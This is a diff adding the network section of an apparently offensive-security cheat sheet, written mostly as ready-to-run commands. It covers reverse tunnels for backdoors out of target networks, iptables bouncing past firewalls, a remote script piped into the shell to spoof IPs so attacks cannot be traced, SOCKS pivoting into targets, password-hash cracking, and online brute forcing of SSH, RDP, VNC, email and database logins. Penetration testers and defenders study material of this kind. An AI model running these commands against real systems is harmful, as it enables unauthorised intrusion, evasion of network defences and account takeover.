@@ -1,0 +1,441 @@
+Network
+
+3.i. Discover hosts
+
+## ARP discover computers on the _LOCAL_ network only
+nmap -n -sn -PR -oG - 192.168.0.1/24
+
+### ICMP discover hosts
+nmap -n -sn -PI -oG - 192.168.0.1/24
+
+## ICMP discover hosts (local LAN) ROOT
+# NET="10.11.0"  # discover 10.11.0.1-10.11.0.254
+seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
+
+3.ii. tcpdump
+
+## Monitor every new TCP connection
+tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'
+
+## Play a *bing*-noise for every new SSH connection
+tcpdump -nplq 'tcp[13] == 2 and dst port 22' | while read -r x; do echo "${x}"; echo -en \\a; done
+
+## Ascii output (for all large packets. Change to >40 if no TCP options are used).
+tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'
+
+3.iii. Tunnel and forwarding
+
+## Connect to SSL (using socat)
+socat stdio openssl-connect:smtp.gmail.com:465
+
+## Connect to SSL (using openssl)
+openssl s_client -connect smtp.gmail.com:465
+
+## Bridge TCP to SSL
+socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
+
+3.iii.a Raw TCP reverse ports
+
+Useful for reverse backdoors that need a TCP Port on a PUBLIC IP Address:
+
+Using segfault.net (free):
+
+# Request a random public TCP port:
+curl sf/port
+echo "Your public IP:PORT is $(cat /config/self/reverse_ip):$(cat /config/self/reverse_port)"
+nc -vnlp $(cat /config/self/reverse_port)
+
+Using bore.pub (free):
+
+# Forward a random public TCP port to localhost:31337
+bore local 31337 --to bore.pub
+
+using serveo.net (free):
+
+# Forward a random public TCP port to localhost:31337
+ssh -R 0:localhost:31337 tcp@serveo.net
+
+using pinggy.io (60 mins free):
+
+ssh -p 443 -R 0:localhost:31337 tcp@a.pinggy.io
+
+See also remote.moe (free) to forward raw TCP from the target to your workstation or playit (free) or ngrok (paid subscription) to forward a raw public TCP port.
+
+Other free services are limited to forward HTTPS only (not raw TCP). Some tricks below show how to tunnel raw TCP over HTTPS forwards (using websockets).
+
+3.iii.b HTTPS reverse tunnels
+
+On the server, use any one of these three HTTPS tunneling services:
+
+### Reverse HTTPS tunnel to forward public HTTPS requests to this server's port 8080:
+ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
+### Or using remote.moe
+ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
+### Or using cloudflared
+curl -fL -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+chmod 755 cloudflared
+cloudflared tunnel --url http://localhost:8080 --no-autoupdate
+
+Either service will generate a new temporary HTTPS-URL for you to use.
+
+Then, use websocat or Gost on both ends to tunnel raw TCP over the HTTPS URL:
+
+A. A simple STDIN/STDOUT pipe via HTTPS:
+
+### On the server convert WebSocket to raw TCP:
+websocat -s 8080
+
+### On the remote target forward stdin/stdout to WebSocket:
+websocat wss://<HTTPS-URL>
+
+B. Forward raw TCP via HTTPS:
+
+### On the server: Gost will translate any HTTP-websocket request to a TCP socks5 request:
+gost -L mws://:8080
+
+Forward port 2222 to the server's port 22.
+
+### On the workstation:
+gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
+### Test the connection (will connect to localhost:22 on the server)
+nc -vn 127.0.0.1 2222
+
+or use the server as a Socks-Proxy EXIT node (e.g. access any host inside the server's network or even the Internet via the server (using the HTTPS reverse tunnel from above):
+
+### On the workstation:
+gost -L :1080 -F 'mwss://<HTTPS-URL>:443'
+### Test the Socks-proxy:
+curl -x socks5h://0 ipinfo.io
+
+More: https://github.com/twelvesec/port-forwarding and Tunnel via Cloudflare to any TCP Service and Awesome Tunneling.
+
+3.iii.c Bouncing traffic with iptables
+
+Bounce through a host/router without needing to run a userland proxy or forwarder:
+
+bounceinit() {
+    echo 1 >/proc/sys/net/ipv4/ip_forward
+    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
+    [ $# -le 0 ] && set -- "0.0.0.0/0"
+    while [ $# -gt 0 ]; do
+        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+        shift 1
+    done
+    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
+    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+}
+bounce() {
+    iptables -t nat -A PREROUTING -p tcp --dport "${1:?}" -m mark --mark 1188 -j DNAT --to ${2:?}:${3:?}
+}
+bounceinit                             # Allow EVERY IP to bounce
+# bounceinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
+
+(See Hackshell bounce)
+
+Then set forwards like so:
+
+bounce 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
+bounce 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
+bounce 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
+
+We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
+
+# Deploy on a target that can only reach 192.168.0.100  
+GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh  
+
+# Access the target  
+GS_HOST=213.171.212.212 gs-netcat -i -s ...
+
+3.vi.c Ghost IP / IP Spoofing
+
+Useful on a host inside the target network. This tool re-configured (without trace) the SHELL: Any program (nmap, cme, ...) started from this SHELL will use a fake IP. All your attacks will originate from a host that does not exist.
+
+source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+
+This also works in combination with:
+
+    Segfault's ROOT Servers: Will connect your ROOT Server to the TARGET NETWORK and using a Ghost IP inside the target network.
+    QEMU Tunnels: As above, but less secure.
+
+3.vi.d Various Tunnel Tricks
+Tunnel via CDN
+
+    Read How to tunnel any TCP service via CloudFlare or use DarkFlare.
+
+Connect your host directly to the remote network
+
+    WireTap - Works as user or root. Uses UDP as transport. (Try it on segfault.)
+    ligolo-ng - Uses TCP as transport. Works well via cloudflare CDN or gs-netcat.
+
+Use SSH as a cheap reverse proxy via Cloudflare
+
+This method is similar to HTTPS reverse tunnels but uses SSH instead of Gost or websocat.
+
+    Advantage: Only uses cloudflared and SSH on the target.
+    Disadvantage: Needs a CF subscription.
+
+    Go to your CF Dashboard -> Zero Trust -> Networks -> Tunnels
+    Create a new 'Cloudflared' tunnel of any name.
+    Select Debian & 64-bit. The Token is not fully shown. Extract the "Token" by copying the grayed out area into a separate document to reveal the entire Token (the long hex-strings after sudo cloudflared service install <TunnelTokenHere>).
+    Add a subdomain (example uses ssh.team-teso.net).
+    Set Type=TCP URL=localhost:22
+
+### On YOUR workstation:
+cloudflared tunnel run --token TunnelTokenHere
+
+### On the TARGET, create a reverse-SOCKS connection with SSH over Cloudflare:
+ssh -o ProxyCommand="cloudflared access tcp --hostname ssh.team-teso.net" root@0 -R 1080
+
+### On your workstation, connect to _any_ host within the target network (example: ipinfo.io)
+curl -x socks5h://0 https://ipinfo.io
+
+Use ProxyChains or GrafTCP to tunnel other protocols via the reverse proxy.
+
+3.iv. Use any tool via Socks Proxy
+Create a tunnel from the target to your workstation using gsocket:
+
+On the target's network:
+
+## Create a SOCKS proxy into the target's network.
+## Use gs-netcat but ssh -D would work as well.
+gs-netcat -l -S
+
+On your workstation:
+
+## Create a gsocket tunnel into the target's network:
+gs-netcat -p 1080
+
+Using ProxyChain:
+
+## Use ProxyChain to access any host on the target's network: 
+echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
+proxychains -f pc.conf -q curl ipinfo.io
+## Scan the router at 192.168.1.1
+proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
+## Start 10 nmaps in parallel:
+seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} 
+
+Using GrafTCP:
+
+## Use graftcp to access any host on the target's network:
+(graftcp-local -select_proxy_mode only_socks5 &)
+graftcp curl ipinfo.io
+graftcp ssh root@192.168.1.1
+graftcp nmap -n -Pn -sV -F --open 19.168.1.1
+
+3.v. Find your public IP address
+
+curl -s wtfismyip.com/json | jq
+curl ifconfig.me
+dig +short myip.opendns.com @resolver1.opendns.com
+host myip.opendns.com resolver1.opendns.com
+
+Get geolocation information about any IP address:
+
+curl https://ipinfo.io/8.8.8.8 | jq
+curl http://ip-api.com/8.8.8.8
+curl https://cli.fyi/8.8.8.8
+
+Get ASN information by IP address:
+
+asn() {
+  [[ -n $1 ]] && { echo -e "begin\nverbose\n${1}\nend"|netcat whois.cymru.com 43| tail -n +2; return; }
+  (echo -e 'begin\nverbose';cat -;echo end)|netcat whois.cymru.com 43|tail -n +2
+}
+asn 1.1.1.1           # Single IP Lookup
+cat IPS.txt | asn     # Bulk Lookup
+
+Check if TOR is working:
+
+curl -x socks5h://localhost:9050 -s https://check.torproject.org/api/ip
+### Result should be {"IsTor":true...
+
+3.vi. Check reachability from around the world
+
+The fine people at https://ping.pe/ let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.
+
+To check how well your (current) host can reach Internet use OONI Probe:
+
+ooniprobe run im
+ooniprobe run websites
+ooniprobe list
+ooniprobe list 1
+
+3.vii. Check/Scan Open Ports on an IP
+
+Censys or Shodan Port lookup service:
+
+curl https://internetdb.shodan.io/1.1.1.1
+
+Fast (-F) vulnerability scan
+
+# Version gathering
+nmap nmap -n -Pn -sCV -F --open --min-rate 10000 scanme.nmap.org
+# Vulns
+nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
+
+Scan for open TCP ports:
+
+_scan_single() {
+    local opt=("${2}")
+    [ -f "$2" ] && opt=("-iL" "$2")
+    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
+}
+scan() {
+    local port="${1:?}"
+    shift 1
+    for ip in "$@"; do
+        _scan_single "$port" "$ip"
+    done
+}
+# scan <ports> <IP or file> ...
+# scan 22,80,443 192.168.0.1
+# scan - 192.168.0.1-254" 10.0.0.1-254
+
+(See Hackshell scan)
+
+Simple bash port-scanner:
+
+timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
+
+3.viii. Crack Password hashes
+
+    NTLM2password to crack (lookup) NTLM passwords
+    wpa-sec to crack (lookup) WPA PSK passwords
+
+HashCat is our go-to tool for everything else:
+
+hashcat my-hash /usr/share/wordlists/rockyou.txt
+
+Using a 10-days 7-16 char hashmask on GPU:
+
+curl -fsSL https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask -o 10-days_7-16.hcmask
+# -d2 == Use GPU #2 only (device #2)
+# -O  == Up to 50% faster but limits password length to <= 15
+# -w1 == workload low (-w3 == high)
+nice -n 19 hashcat -o cracked.txt my-hash.txt -w1 -a3 10-days_7-16.hcmask -O -d2
+
+Crack OpenSSH's known_hosts hashes to reveal the IP address:
+
+curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -O
+curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/kh-converter.py -O
+python3 kh-converter.py ~/.ssh/known_hosts >known_hosts_hashes
+hashcat -m 160 --quiet --hex-salt known_hosts_hashes -a 3 ipv4_hcmask.txt 
+
+👉 Read the FAQ.
+
+Be aware that $6$ hashes are SLOW. Even the 1-minute 7-16 char hashmask would take many days on a 8xRTX4090 cluster to complete.
+
+Rent a RTX-4090 GPU-Cluster at vast.ai for $0.40/h and use dizcza/docker-hashcat:cuda (read more).
+
+Otherwise, use Crackstation, shuck.sh, ColabCat/cloud/Cloudtopolis or crack on your own AWS instances.
+
+3.xi. Brute Force Passwords / Keys
+
+The following is for brute forcing (guessing) passwords of ONLINE SERVICES.
+
+GMail Imbeciles - CLICK HERE
+
+
+
+All tools are pre-installed on segfault:
+
+ssh root@segfaul.net # password is 'segfault'
+
+(You may want to use your own EXIT node)
+
+Tools:
+
+    Ncrack
+    Nmap BRUTE
+    THC Hydra
+    Medusa / docs
+    Metasploit
+    Crowbar - great for trying all ssh keys on a target IP range.
+
+Username & Password lists:
+
+    /usr/share/nmap/nselib/data
+    /usr/share/wordlists/seclists/Passwords
+    https://github.com/berzerk0/Probable-Wordlists - >THC's FAVORITE<
+    https://github.com/danielmiessler/SecLists
+    https://wordlists.assetnote.io
+    https://weakpass.com
+    https://crackstation.net/
+
+Set Username/Password list and Target host.
+
+ULIST="/usr/share/wordlists/brutespray/mysql/user"
+PLIST="/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"
+T="192.168.0.1"
+
+Useful Nmap parameters:
+
+--script-args userdb="${ULIST}",passdb="${PLIST}",brute.firstOnly
+
+Useful Ncrack parameters:
+
+-U "${ULIST}"
+-P "${PLIST}"
+
+Useful Hydra parameters:
+
+-t4      # Limit to 4 tasks
+-l root  # Set username
+-V       # Show each login/password attempt
+-s 31337 # Set port
+-S       # Use SSL
+-f       # Exit after first valid login
+
+## SSH
+nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
+ncrack -P "${PLIST}" --user root "ssh://${T}"
+hydra -P "${PLIST}" -l root "ssh://$T"
+
+## Remote Desktop Protocol / RDP
+ncrack -P "${PLIST}" --user root -p3389 "${T}"
+hydra -P "${PLIST}" -l root "rdp://$T"
+
+## FTP
+hydra -P "${PLIST}" -l user "ftp://$T"
+
+## IMAP (email)
+nmap -p 143,993 --script imap-brute "$T"
+
+## POP3 (email)
+nmap -p110,995 --script pop3-brute "$T"
+
+## MySQL
+nmap -p3306 --script mysql-brute "$T"
+
+## PostgreSQL
+nmap -p5432 --script pgsql-brute "$T"
+
+## SMB (windows)
+nmap --script smb-brute "$T"
+
+## Telnet
+nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"
+
+## VNC
+nmap -p5900 --script vnc-brute "$T"
+ncrack -P "${PLIST}" --user root "vnc://$T"
+hydra -P "${PLIST}" "vnc://$T"
+medusa -P "${PLIST}" –u root –M vnc -h "$T"
+
+## VNC (with metasploit)
+msfconsole
+use auxiliary/scanner/vnc/vnc_login
+set rhosts 192.168.0.1
+set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
+run
+
+## HTML basic auth
+echo admin >user.txt                     # Try only 1 username
+echo -e "blah\naaddd\nfoobar" >pass.txt  # Add some passwords to try. 'aaddd' is the valid one.
+nmap -p80 --script http-brute --script-args \
+   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
+   pentesteracademylab.appspot.com
